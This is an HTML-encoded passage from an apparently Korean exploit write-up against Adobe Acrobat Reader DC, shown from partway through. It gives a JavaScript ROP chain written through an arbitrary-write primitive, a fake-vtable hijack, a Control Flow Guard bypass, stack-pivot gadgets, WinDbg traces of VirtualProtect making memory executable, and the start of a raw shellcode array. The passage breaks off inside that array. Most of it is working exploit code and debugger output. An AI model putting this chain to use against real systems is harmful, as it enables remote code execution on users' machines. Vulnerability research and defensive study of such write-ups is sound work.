    &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// new protect&lt;/span&gt;
    arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x540&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;// old protect&lt;/span&gt;
];

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; rop.length; i++) AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt; * i, rop[i]);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xBCF5;&amp;#xC81C;&amp;#xB41C; vtable&amp;#xC5D0; ROP &amp;#xAC00;&amp;#xC82F; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC0BD;&amp;#xC785;&amp;#xD558;&amp;#xACE0; &lt;code&gt;textField&lt;/code&gt;&amp;#xC778; &lt;code&gt;f0&lt;/code&gt;&amp;#xC758; vtable &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; Fake vtable&amp;#xB85C; &amp;#xC870;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;f0.defaultValue&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74; &lt;code&gt;vtable + 0x48&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &lt;code&gt;defaultValue&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294;&amp;#xB370; Fake vtable&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;.text:20EFAA60 sub_20EFAA60    proc near               
.text:20EFAA60                                         
.text:20EFAA60                 mov     eax, [ecx]
.text:20EFAA62                 push    0Dh
.text:20EFAA64                 call    dword ptr [eax+30h]
.text:20EFAA67                 retn
.text:20EFAA67 sub_20EFAA60    endp&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Adobe Acrobat Reader DC&amp;#xB294; CFG(Control Flow Guard)&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4; vtable&amp;#xC744; &amp;#xD1B5;&amp;#xD55C; &amp;#xAC00;&amp;#xC0C1; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC774;&amp;#xB098; &amp;#xD568;&amp;#xC218; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xD1B5;&amp;#xD55C; &amp;#xD638;&amp;#xCD9C; &amp;#xB4F1;&amp;#xC758; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xB54C; &lt;code&gt;__guard_check_icall_fptr&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &lt;code&gt;ntdll!LdrpValidateUserCallTarget&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC778;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xACE0; &amp;#xADF8;&amp;#xB807;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xACBD;&amp;#xC6B0; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &amp;#xAC15;&amp;#xC81C; &amp;#xC885;&amp;#xB8CC;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; vtable&amp;#xC5D0; &amp;#xC9C1;&amp;#xC811; ROP &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xC0BD;&amp;#xC785;&amp;#xD558;&amp;#xBA74; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC2E4;&amp;#xD328;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;AXTEFontAccess::&lt;/code&gt;vftable&amp;#x2019;&lt;code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xAC04;&amp;#xC811;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC774;&amp;#xACE0; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; RVA &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C;&lt;/code&gt;__guard_fids_table`&amp;#xC5D0;&amp;#xB3C4; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;.rdata:211315C0 ; const AXTEFontAccess::`vftable&amp;apos;
.rdata:211315C0 ??_7AXTEFontAccess@@6B@ dd offset sub_20DFFBE0
.rdata:211315C0                                         ; DATA XREF: sub_20DFF7B6+21&amp;#x2191;o
.rdata:211315C0                                         ; sub_20DFFAAA+6&amp;#x2191;o
                                       ....
.rdata:21131674                 dd offset sub_20EFAA60
                                       ....&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;ntdll!LdrpValidateUserCallTarget&lt;/code&gt;&amp;#xC758; &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xD1B5;&amp;#xACFC;&amp;#xD558;&amp;#xACE0; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=0be950e0 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63a89a3b &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c170 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl nz na po nc
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200202
AcroForm!hb_ot_tags_to_script_and_language+0x68f9b:
63a89a3b ff153ca9fc63    call    dword ptr [AcroForm!DllUnregisterServer+0x50e8dc (63fca93c)] ds:002b:63fca93c={ntdll!LdrpValidateUserCallTarget (777c88e0)}
0:000&amp;gt; p
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=0c7dd54c &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63a89a41 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c170 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!hb_ot_tags_to_script_and_language+0x68fa1:
63a89a41 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;0457c188&lt;/span&gt;=10c7d038
0:000&amp;gt; p
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=0c7dd54c &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d038 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63a89a44 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c170 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!hb_ot_tags_to_script_and_language+0x68fa4:
63a89a44 ffd6            call    esi {AcroForm!DllUnregisterServer+0x42ea00 (63eeaa60)}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;mov eax, [ecx]&lt;/code&gt;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; ecx(&lt;code&gt;this&lt;/code&gt;)&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; Fake vtable&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;(0x20000158)&amp;#xAC00; eax&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;call dword ptr [eax + 30h]&lt;/code&gt;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; Fake vtable + 0x30&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; stack pivot &amp;#xAC00;&amp;#xC82F;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; CFG &amp;#xAC80;&amp;#xC0AC;&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xC9C0; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; ROP &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; CFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=0c7dd54c &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d038 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c16c &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!DllUnregisterServer+0x42ea00:
63eeaa60 8b01            mov     eax,dword ptr [ecx]  ds:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;10c7d038&lt;/span&gt;=20000158
0:000&amp;gt; t
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d038 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63eeaa62 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c16c &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!DllUnregisterServer+0x42ea02:
63eeaa62 6a0d            push    0Dh
0:000&amp;gt; t
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d038 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63eeaa64 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c168 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!DllUnregisterServer+0x42ea04:
63eeaa64 ff5030          call    dword ptr [eax+30h]  ds:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;20000188&lt;/span&gt;=63a46984
0:000&amp;gt; u 63a46984
AcroForm!hb_ot_tags_to_script_and_language+0x25ee4:
63a46984 8be0            mov     esp,eax
63a46986 ffc9            dec     ecx
63a46988 c3              ret&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xAC00;&amp;#xC82F;&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74; eax(&lt;code&gt;arrBufPtr + 0x100&lt;/code&gt;)&amp;#xAC12;&amp;#xC744; esp&amp;#xC5D0; &amp;#xC4F0;&amp;#xBA74;&amp;#xC11C; stack pivot&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xACE0; &lt;code&gt;ret&lt;/code&gt;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xB294;&amp;#xB370; &amp;#xC774;&amp;#xB54C;&amp;#xC758; esp&amp;#xC778; 0x20000158&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xB610; &amp;#xB2E4;&amp;#xB978; stack pivot &amp;#xAC00;&amp;#xC82F;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d037 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=6380e646 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=2000015c &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl nz na po cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200203
AcroForm+0x1e646:
6380e646 5c              pop     esp
0:000&amp;gt; t
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d037 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=6380e647 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=20000358 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl nz na po cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200203
AcroForm+0x1e647:
6380e647 c3              ret
0:000&amp;gt; dd esp
20000358  757d0760 20000458 20000458 00001000
20000368  00000040 20000598 00000000 00000000&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCD5C;&amp;#xC885;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; esp&amp;#xB294; 0x20000358&amp;#xB85C; &amp;#xBC14;&amp;#xB00C;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &amp;#xD55C;&amp;#xBC88; &amp;#xB354; &lt;code&gt;ret&lt;/code&gt;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &lt;code&gt;KERNEL32!VirtualProtectStub&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; eip&amp;#xAC00; &amp;#xBCC0;&amp;#xACBD;&amp;#xB418;&amp;#xACE0; pivot&amp;#xB41C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; &amp;#xC778;&amp;#xC790;&amp;#xB4E4;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &lt;code&gt;VirtualProtect(0x20000458, 0x1000, PAGE_EXECUTE_READWRITE, 0x20000598)&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xD6A8;&amp;#xACFC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;6-Insert-Shellcode&#34;&gt;&lt;a href=&#34;#6-Insert-Shellcode&#34; class=&#34;headerlink&#34; title=&#34;6. Insert Shellcode&#34;&gt;&lt;/a&gt;6. Insert Shellcode&lt;/h2&gt;&lt;p&gt;&amp;#xC0BD;&amp;#xC785;&amp;#xB41C; ROP &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB294; &amp;#xC2E4;&amp;#xD589; &amp;#xAD8C;&amp;#xD55C;&amp;#xC774; &amp;#xBD80;&amp;#xC5EC;&amp;#xB41C; 0x20000458&amp;#xB85C; &amp;#xB9AC;&amp;#xD134;&amp;#xD558;&amp;#xACE0; &amp;#xC774; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; shellcode&amp;#xAC00; &amp;#xC0BD;&amp;#xC785;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; shellcode = [
    &lt;span class=&#34;hljs-comment&#34;&gt;// recovery prefix       (store reg context)&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;// 0x909090CC,&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x89e083e8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x18535256&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x57505590&lt;/span&gt;,

    &lt;span class=&#34;hljs-comment&#34;&gt;// shellcode&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;835867240&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1667329123&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1415139921&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1686860336&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2339769483&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1980542347&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;814448152&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2338274443&lt;/span&gt;,
    &lt;span class=&#34;hljs-number&#34;&gt;1545566347&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1948196865&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4270543903&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;605009708&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;390218413&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2168194903&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1768834421&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4035671071&lt;/span&gt;,
